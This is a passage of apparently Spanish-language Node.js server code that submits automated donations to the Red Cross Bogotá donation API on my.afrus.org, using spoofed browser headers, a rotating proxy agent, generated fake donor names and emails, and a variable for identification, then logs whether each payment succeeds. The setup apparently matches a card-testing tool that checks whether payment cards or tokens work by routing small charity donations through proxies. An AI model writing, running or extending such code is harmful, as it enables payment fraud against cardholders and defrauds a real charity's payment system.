      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json;charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'host': 'my.afrus.org',
      'Cookie': cookiesToHeader(cookies)
    };
    const body = {
      treatment: null,
      form_id: 3243,
      country_id: 49,
      language_code: 'ES',
      url_landing: 'https://donar.cruzrojabogota.org.co/',
      amount: amount + '.00',
      is_subscription: false,
      gateway_id: 8,
      campaign_id: 1312,
      organization_id: 18,
      first_name: fakeUser.firstName,
      last_name: fakeUser.lastName,
      email: fakeUser.email,
      phone: phone,
      currency_id: 36,
      state: '',
      city: '',
      gender: '',
      born_date: null,
      street: '',
      street_number: '',
      zip_code: '',
      rest_address: '',
      rest_address2: '',
      countryPhone: 'CO',
      type: 1,
      identification_type: 4,
      identification: cc,
      id_transaction: null,
      custom_fields: {},
      payment_method: 'card',
      unomi_metadata: {},
      organization: '',
      frequency_id: 1,
      fundraising_campaign_id: null,
      terms_accepted: true,
      terms2_accepted: null,
      private: false,
      payment_token: uuid
    };
    const response = await axios.post(
      'https://my.afrus.org/api/donation',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 donation final Status: ${response.status}`);
    if (response.data.code) {
      addLog(logs, `🔴 Resultado: code=${response.data.code}, message=${response.data.message}, reference=${response.data.reference || ''}`);
    } else {
      addLog(logs, `🟢 Resultado: ${JSON.stringify(response.data)}`);
    }
    return response.data;
  } catch (error) {
    if (error.response && error.response.data) {
      addLog(logs, `🔴 Resultado: code=${error.response.data.code}, message=${error.response.data.message}, reference=${error.response.data.reference || ''}`);
    } else {
      addLog(logs, `🔴 donation final Error: ${error.message}`);
    }
    throw error;
  }
}

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});